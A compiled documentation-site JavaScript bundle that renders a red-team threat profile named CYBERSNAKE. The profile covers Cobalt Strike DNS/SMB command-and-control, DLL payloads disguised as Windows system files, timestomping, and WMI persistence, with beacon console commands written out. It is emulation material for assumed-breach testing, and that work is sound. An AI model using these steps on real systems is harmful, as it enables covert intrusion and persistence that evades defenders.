"use strict";(self.webpackChunkbs_support=self.webpackChunkbs_support||[]).push([[137],{3905:(e,t,r)=>{r.d(t,{Zo:()=>c,kt:()=>u});var i=r(7294);function n(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function a(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);t&&(i=i.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,i)}return r}function o(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?a(Object(r),!0).forEach((function(t){n(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):a(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function l(e,t){if(null==e)return{};var r,i,n=function(e,t){if(null==e)return{};var r,i,n={},a=Object.keys(e);for(i=0;i<a.length;i++)r=a[i],t.indexOf(r)>=0||(n[r]=e[r]);return n}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(i=0;i<a.length;i++)r=a[i],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(n[r]=e[r])}return n}var s=i.createContext({}),p=function(e){var t=i.useContext(s),r=t;return e&&(r="function"==typeof e?e(t):o(o({},t),e)),r},c=function(e){var t=p(e.components);return i.createElement(s.Provider,{value:t},e.children)},d={inlineCode:"code",wrapper:function(e){var t=e.children;return i.createElement(i.Fragment,{},t)}},m=i.forwardRef((function(e,t){var r=e.components,n=e.mdxType,a=e.originalType,s=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),m=p(r),u=n,k=m["".concat(s,".").concat(u)]||m[u]||d[u]||a;return r?i.createElement(k,o(o({ref:t},c),{},{components:r})):i.createElement(k,o({ref:t},c))}));function u(e,t){var r=arguments,n=t&&t.mdxType;if("string"==typeof e||n){var a=r.length,o=new Array(a);o[0]=m;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l.mdxType="string"==typeof e?e:n,o[1]=l;for(var p=2;p<a;p++)o[p]=r[p];return i.createElement.apply(null,o)}return i.createElement.apply(null,r)}m.displayName="MDXCreateElement"},3071:(e,t,r)=>{r.r(t),r.d(t,{contentTitle:()=>o,default:()=>c,frontMatter:()=>a,metadata:()=>l,toc:()=>s});var i=r(7462),n=(r(7294),r(3905));const a={title:"Threat Profile: CYBERSNAKE",description:"CYBERSNAKE threat profile example\n"},o="Threat Profile (CYBERSNAKE)",l={unversionedId:"Threat Profiles/cybersnake",id:"Threat Profiles/cybersnake",isDocsHomePage:!1,title:"Threat Profile: CYBERSNAKE",description:"CYBERSNAKE threat profile example\n",source:"@site/docs/Threat Profiles/cybersnake.md",sourceDirName:"Threat Profiles",slug:"/Threat Profiles/cybersnake",permalink:"/docs/Threat Profiles/cybersnake",version:"current",frontMatter:{title:"Threat Profile: CYBERSNAKE",description:"CYBERSNAKE threat profile example\n"},sidebar:"tutorialSidebar",previous:{title:"Threat Profile - BLUEHEART",permalink:"/docs/Threat Profiles/blueheart"},next:{title:"Threat Profile: SIMPLESAM",permalink:"/docs/Threat Profiles/simplesam"}},s=[{value:"Description",id:"description",children:[]},{value:"Characteristics",id:"characteristics",children:[]},{value:"System Modifications",id:"system-modifications",children:[{value:"Files",id:"files",children:[]}]},{value:"Registry",id:"registry",children:[]},{value:"WMI",id:"wmi",children:[]},{value:"Deployment Steps",id:"deployment-steps",children:[]},{value:"Persistence Steps (via CobaltStrike Beacon Console)",id:"persistence-steps-via-cobaltstrike-beacon-console",children:[]}],p={toc:s};function c(e){let{components:t,...r}=e;return(0,n.kt)("wrapper",(0,i.Z)({},p,r,{components:t,mdxType:"MDXLayout"}),(0,n.kt)("h1",{id:"threat-profile-cybersnake"},"Threat Profile (CYBERSNAKE)"),(0,n.kt)("div",{className:"admonition admonition-tip alert alert--success"},(0,n.kt)("div",{parentName:"div",className:"admonition-heading"},(0,n.kt)("h5",{parentName:"div"},(0,n.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,n.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"12",height:"16",viewBox:"0 0 12 16"},(0,n.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"}))),"tip")),(0,n.kt)("div",{parentName:"div",className:"admonition-content"},(0,n.kt)("p",{parentName:"div"},"A modified version of this profile was used on an assumed breach engagement. This profile is provide as an example to show details that supported a real engagement. A key focus of this profile is the use of DNS for C2. "))),(0,n.kt)("h2",{id:"description"},"Description"),(0,n.kt)("p",null,"C2 threat inspired by the Snake Campaign & Cyber Espionage Toolkit uses DNS instead of HTTP for communications"),(0,n.kt)("blockquote",null,(0,n.kt)("p",{parentName:"blockquote"},"Reference: ",(0,n.kt)("a",{parentName:"p",href:"http://www.baesystems.com/en/cybersecurity/feature/the-snake-campaign"},"http://www.baesystems.com/en/cybersecurity/feature/the-snake-campaign"))),(0,n.kt)("h2",{id:"characteristics"},"Characteristics"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"C2 Backend: CobaltStrike"),(0,n.kt)("li",{parentName:"ul"},"Port(s): 53, 445 (DNS, SMB)"),(0,n.kt)("li",{parentName:"ul"},"C2 communication using DNS and SMB Traffic"),(0,n.kt)("li",{parentName:"ul"},"Executes in browser only when browser is active"),(0,n.kt)("li",{parentName:"ul"},"IP communication using DNS hostnames")),(0,n.kt)("p",null,"Cobalt Strike HTTP Request Profile:"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"None")),(0,n.kt)("h2",{id:"system-modifications"},"System Modifications"),(0,n.kt)("h3",{id:"files"},"Files"),(0,n.kt)("h4",{id:"smb-payload"},"SMB Payload"),(0,n.kt)("p",null,"PATH: ",(0,n.kt)("inlineCode",{parentName:"p"},"C:\\Windows\\System32\\KBDUS1.DLL")),(0,n.kt)("p",null,"Binary modified using a resource hacker to look similar to other Windows files "),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"File Description: United States Keyboard Layout Alternate"),(0,n.kt)("li",{parentName:"ul"},"File Version: 6.1.7601.17514"),(0,n.kt)("li",{parentName:"ul"},"Product Name: Microsoft(r) Windows(r) Operating System"),(0,n.kt)("li",{parentName:"ul"},"Product Version: 6.1.7601.17514"),(0,n.kt)("li",{parentName:"ul"},"Copyright: (c)Microsoft Corporation. All right reserved"),(0,n.kt)("li",{parentName:"ul"},"Date Modified:  11/20/2010 4:29:11 PM")),(0,n.kt)("h4",{id:"dns-payload"},"DNS Payload"),(0,n.kt)("p",null,"PATH: ",(0,n.kt)("inlineCode",{parentName:"p"},"c:\\windows\\system32\\wanAPI.dll")),(0,n.kt)("p",null,"Binary modified using a resource hacker to look similar to other Windows files"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"File Description: Mbnapi"),(0,n.kt)("li",{parentName:"ul"},"File Version: 6.1.7600.16385"),(0,n.kt)("li",{parentName:"ul"},"Product Name: Microsoft(r) Windows(r) Operating System"),(0,n.kt)("li",{parentName:"ul"},"Product Version: 6.1.7600.16385"),(0,n.kt)("li",{parentName:"ul"},"Copyright: (c)Microsoft Corporation. All right reserved"),(0,n.kt)("li",{parentName:"ul"},"Date Modified: 07/13/2009 7:56:53 PM")),(0,n.kt)("h2",{id:"registry"},"Registry"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"None")),(0,n.kt)("h2",{id:"wmi"},"WMI"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"SMB Beacon: WMI KBDMonitor Created containing start up code to launch a smb beacon at each reboot"),(0,n.kt)("li",{parentName:"ul"},"DNS Beacon: WMI MSUpdate Created containing start up code to launch a dns beacon at each reboot")),(0,n.kt)("hr",null),(0,n.kt)("h2",{id:"deployment-steps"},"Deployment Steps"),(0,n.kt)("ol",null,(0,n.kt)("li",{parentName:"ol"},"Create WMI script with file and path to payload"),(0,n.kt)("li",{parentName:"ol"},"Build payloads using profile"),(0,n.kt)("li",{parentName:"ol"},"Build 64 and 32 bit DLL files"),(0,n.kt)("li",{parentName:"ol"},"Use a Resource Hacker utility to modify dll to match File Attributes"),(0,n.kt)("li",{parentName:"ol"},"Deploy dll to target system"),(0,n.kt)("li",{parentName:"ol"},"Verify time matches surrounding files (TimeStomp if needed)")),(0,n.kt)("h2",{id:"persistence-steps-via-cobaltstrike-beacon-console"},"Persistence Steps (via CobaltStrike Beacon Console)"),(0,n.kt)("p",null,"KBDUS1.dll (SMB Beacon)"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre"},'cd c:\\windows\\temp\nupload /data/PAYLOADS/fullstaged/64/KBDUS1.DLL\npowershell-import /data/PAYLOADS/Set-FileTimeStamps.ps1\npowershell Set-FileTimeStamps c:\\windows\\temp\\KBDUS1.DLL "11/20/2010 4:29:11 PM"\nshell move c:\\windows\\temp\\KBDUS1.DLL c:\\windows\\system32\npowershell-import /data/PAYLOADS/wmi_persistence_kbdus1.ps1\npowershell Invoke-WMI-Persistence\n')),(0,n.kt)("p",null,"wanAPI.dll (DNS Beacon)"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre"},'cd c:\\windows\\temp\nupload /data/PAYLOADS/staged/wanAPI.dll\npowershell-import /data/PAYLOADS/Set-FileTimeStamps.ps1\npowershell Set-FileTimeStamps c:\\windows\\temp\\wanAPI.dll "07/13/2009 7:56:53 PM"\nshell move c:\\windows\\temp\\wanAPI.dll c:\\windows\\system32\npowershell-import /data/PAYLOADS/wmi_persistence_wanapi.ps1\npowershell Invoke-WMI-Persistence\n')))}c.isMDXComponent=!0}}]);